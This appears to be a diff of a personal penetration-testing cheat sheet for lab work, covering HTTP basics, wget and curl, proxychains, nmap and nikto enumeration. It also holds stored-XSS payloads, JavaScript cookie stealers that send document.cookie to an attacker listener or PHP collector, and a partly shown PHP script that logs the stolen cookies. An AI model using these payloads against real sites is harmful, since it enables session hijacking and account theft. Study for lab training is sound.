@@ -1,13 +1,11 @@
-p0wnyshell download
-
-#HTTP reponse codes
+/////////HTTP reponse codes////////
 10X == Informational
 2XX == Success
 30X == Redirection
 4XX == Client Error
 5XX == Server Error
 
-#HTTP fields
+/////////HTTP fields/////////
 User-Agent
 Referer
 Cookie
@@ -15,40 +13,40 @@ Date
 Server
 Set-Cookie
 
-#WGET
+/////////WGET/////////
 wget -r -l2 -P /tmp ftp://ftpserver/
 wget --save-cookies cookies.txt --keep-session-cookies --post-data 'user=1&password=2' http://website
 wget --load-cookies cookies.txt -p http://....com/interesting/article.php
 
-#proxychains with firefox
+/////////proxychains with firefox/////////
 preferences-->connection settings-->sockshost localhost 9050
 -or-
 addons--> foxyproxy--> (icon in right corner) settings--> add--> (type)socks5--> (proxy ip) localhost --> (port) 9050
 
-#CURL
+/////////CURL/////////
 curl -o stuff.html http://website/stuff.html
 curl 'www..com' -H 'Cookie: name=123; settings=1,2,3,4,5,6,7' --data 'name=Stan' | base64 -d > item.png
 
-#decode base65 in CLI
+/////////decode base65 in CLI/////////
 echo asdfDEF== | base64 -d
 
-#Enumeration
+/////////Enumeration/////////
 (in the url) /robots.txt	#tells you what my be there
 nmap --script=http-enum 10.50.x.x
 
-#Nikto
+/////////Nikto/////////
 nikto --host=http://10.50.20.170
 
-#Stored XSS
+/////////Stored XSS/////////
 <img src="http://10.50.XX.XX" onerror="window.open(&quot;http://10.50.CC.CC:8000/ram.png&quot;,&quot;xss&quot;,'height=500,width=500');">
 
-#js cookie stealer to send to nc listener
+/////////js cookie stealer to send to nc listener/////////
 <script>document.location="http://x.x.x.x:8000? username="+document.cookie;</script>
 
-#js posted to the stored xss vulnerable site
+/////////js posted to the stored xss vulnerable site/////////
 <script>document.location="http://10.50.20.170/uploads/cookiestealer.php?username="+document.cookie;</script>
 
-#php script on a webserver that will accept and store the stolen cookie. Must create cookiefile.txt first
+/////////php script on a webserver that will accept and store the stolen cookie. Must create cookiefile.txt first/////////
 <?php
 $cookie = $_GET["username"];
 $steal = fopen("/var/www/html/uploads/cookiefile.txt", "a+");
